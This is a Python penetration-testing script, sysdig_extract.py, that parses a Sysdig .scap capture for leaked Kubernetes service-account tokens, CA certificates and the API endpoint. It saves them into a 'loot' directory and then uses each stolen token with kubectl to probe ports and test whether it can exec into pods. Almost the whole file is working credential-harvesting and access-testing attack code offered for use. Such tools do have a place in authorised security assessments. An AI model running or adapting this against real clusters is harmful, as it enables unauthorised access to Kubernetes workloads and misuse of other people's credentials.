#!/usr/bin/env python3
#
# MIT License
#
# Copyright (c) 2019 Milton Valencia
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
# Script name       : sysdig_extract.py
# Version           : 1.0
# Created date      : 3/26/19
# Last update       : 3/27/19
# Author            : Milton Valencia (wetw0rk)
# Python version    : 3.5
# Designed OS       : Linux (preferably a penetration testing distro)
#
# Description :
#   This script will attempt to extract the following from a SysDig `.scap`
#   capture file.
#     - API Endpoint
#     - API Endpoint Port
#     - Account Tokens
#     - Account CA Certificates
#   Once found an attempt will be made to exec into a pod with each token/ca
#
# Tested on:
#   Sysdig 0.24.2
#   running "file" should output: pcap-ng capture file - version 1.2
#
# Dependencies :
#   None
#

import os
import sys
import socket
import subprocess

# pcb: print colors and banners
class pcb:
  RED   = "\033[;1m\033[1;91m"
  BLUE  = "\033[;1m\033[1;94m"
  GREEN = "\033[;1m\033[0;92m"
  ENDC  = "\033[0;0m"
  ERROR = "\033[;1m\033[1;91m[-]\033[0;0m"
  GOOD  = "\033[;1m\033[0;92m[+]\033[0;0m"
  INFO  = "\033[;1m\033[1;94m[*]\033[0;0m"

# sysdig_extractor: extraction class for sensitive data
class sysdig_extractor():

  def __init__(self, filename):
    self.filename = subprocess.Popen(['strings', filename], stdout=subprocess.PIPE).communicate()[0]
    self.findings = {}
    self.endpoint = ""
    self.ports = []

  def extract_tokens_cert(self):
    CH = \
    [
      "-----BEGIN CERTIFICATE-----",
      "-----END CERTIFICATE-----"
    ]
    self.filename = self.filename.decode("utf-8")
    lines = self.filename.split('\n')
    ef = 0

    for i in range(len(lines)):
      '''
      Extract leaked tokens
      '''
      if lines[i].startswith("eyJ"):
        token_name = lines[i-1].rstrip('\n').split('/')
        try:
          self.findings[token_name[len(token_name)-3]] = [lines[i].rstrip('\n')]
        except:
          pass
        '''
        Extract full certificate
        '''
        full_cert = ""
        j = i
        try:
          while (lines[j].rstrip('\n') != CH[0]):
            j += 1
          while (lines[j].rstrip('\n') != CH[1]):
            full_cert += lines[j] + "\n" 
            if (len(lines[j].rstrip('\n')) < 24):
              full_cert = ""
              break
            j += 1
        except:
          print("%s error with extraction of cert" % pcb.ERROR)
          continue
        # assign cert to owner
        if (lines[j].rstrip('\n') == CH[1]):
          full_cert += lines[j] + "\n" 
          try:
            self.findings[token_name[len(token_name)-3]] += full_cert,
          except:
            pass
      '''
      Locate API endpoint, and possible port
      '''
      if (("masteretcdfrontend" in lines[i]) and ef == 0):
        l = lines[i]
        self.endpoint = l.split(" ")[l.split(" ").index("masteretcdfrontend")+1].split("/")[1]
        print("{:s} endpoint found: https://{:s}".format(pcb.GOOD, self.endpoint))
        ef = 1
      if (("conntrack_entry" in lines[i]) and ("dst=\"{:s}\"".format(socket.gethostbyname(self.endpoint)) in lines[i])):
        l = lines[i]
        self.ports += l.split(" ")[len(l.split(" "))-1].split(",")[1],

    self.find_endpoint()

    print("%s summary of findings shown below (false positives in red)" % pcb.GOOD)
    print("\t{:s}{:<40} {:<15} {:<15}{:s}".format(pcb.BLUE, "ACCOUNT", "TOKEN PROOF", "CERT PROOF", pcb.ENDC))
    list_r = []
    for k, v in self.findings.items():
      try:
        c = k[0]
      except:
        c = "{"
      # carve out false positives or invalid data
      if ((c >= 'A' and c <= 'Z' or c >= 'a' and c <= 'z') and (len(k) >= 4)):
        try:
          print("\t{:<40} {:<15} {:<15}".format(k, v[0][0:8], v[1][5:22]))
        except:
          print("\t{:<40} {:<15} {:<15}".format(k, v[0][0:8], "NULL"))
      else:
        try:
          list_r += "\t{:<40} {:<15} {:<15}".format(k[0:30], v[0][0:8], v[1][5:22]),
        except:
          list_r += "\t{:<40} {:<15} {:<15}".format(k[0:30], v[0][0:8], "NULL"),
    print("\t{:s}{:<40} {:<15} {:<15}{:s}".format(pcb.RED, "ACCOUNT", "TOKEN PROOF", "CERT PROOF", pcb.ENDC))
    for i in range(len(list_r)):
      print(list_r[i])

    self.write_and_test()
    return

  def find_endpoint(self):
    fd = open("tmp_log.txt", "w")
    self.ports = list(set(self.ports))
    cf = ""
    for i in range(len(self.ports)):
      fd = open("tmp_log.txt", "w")
      try:
        c = int(self.ports[i])
      except:
        c = "Invalid"

      if (c != "Invalid"):
        cmd = 'kubectl --token=L --certificate-authority=tmp_log.txt --server={:s}:{:s} get pods'.format(
          self.endpoint, self.ports[i]
        )
        try:
          o = subprocess.check_output([cmd], shell=True, stderr=fd, timeout=1)
        except:
          pass
        fd.close()
        fd = open("tmp_log.txt", "r")
        r = fd.read()
        if ("timeout" in r):
          pass
        else:
          print("\t{:s} possible endpoint port located {:s}".format(pcb.GOOD, self.ports[i]))
          cf = self.ports[i]
        fd.close()
    os.system("rm tmp_log.txt")
    self.endpoint = "https://{:s}:{:s}".format(self.endpoint, cf)
    return

  def write_and_test(self):
    print("%s extracting findings into \"loot\" directory" % pcb.GOOD)
    try:
      os.mkdir("loot")
    except:
      print("%s directory exists continuing exfiltration" % pcb.INFO)
    os.chdir("loot")
    for k, v in self.findings.items():
      try:
        os.mkdir(k)
        os.chdir(k)
        try:
          maybe = v[1]
          fd = open("token", "w")
          fd.write(v[0])
          fd.close()
          fd = open("ca.crt", "w")
          fd.write(maybe)
          fd.close()
        except:
          fd = open("token", "w")
          fd.write(v[0])
          fd.close()
        os.chdir("..")
      except:
        print("%s previously discovered entry: %s" % (pcb.ERROR, k))

    self.check_exec()
    return

  def check_exec(self):
    print("%s starting exec checks on all discovered accounts" % pcb.INFO)
    print("%s using %s as our target endpoint (if fails try other possible ports)" % (pcb.INFO, self.endpoint))
    accounts = os.listdir('.')

    print("%s summary of findings shown below" % pcb.GOOD)
    print("\t{:s}{:<40} {:<15}{:s}".format(pcb.BLUE,"ACCOUNT", "CAN EXEC", pcb.ENDC))
    list_r = []
    devnull = open(subprocess.os.devnull, 'w')
    for i in range(len(accounts)):
      os.chdir(accounts[i])
      c = os.getcwd().split("/")[len(os.getcwd().split("/"))-1]
      cmd =  ("kubectl --token=`cat token` --certificate-authority=ca.crt"
        " --server={:s} auth can-i exec pods"
      ).format(self.endpoint)
      try:
        o = subprocess.check_output([cmd], shell=True, stderr=devnull)
      except:
        o = "ERROR"
        pass

      # decode response only ignore str object
      try:
        o = o.decode("utf-8")
      except:
        pass

      if (o.rstrip("\n") == 'yes' or o.rstrip("\n") == 'no'):
        r = o.rstrip("\n")
      else:
        r = "ERROR"

      if ((c[0] >= 'A' and c[0] <= 'Z' or c[0] >= 'a' and c[0] <= 'z') and (len(c) >= 4)): 
        print("\t{:<40} {:<15}".format(c[0:30], r))
      else:
        list_r += ("\t{:<40} {:<15}".format(c[0:30], r)),
      os.chdir('..')
    devnull.close()

    print("\t{:s}{:<40} {:<15}{:s}".format(pcb.RED,"ACCOUNT", "CAN EXEC", pcb.ENDC))
    for i in range(len(list_r)):
      print(list_r[i])

    return

def main():
  try:
    exfil = sysdig_extractor(sys.argv[1])
    exfil.extract_tokens_cert()
  except:
    print("usage: %s file.scap" % (sys.argv[0]))
    exit()

main()

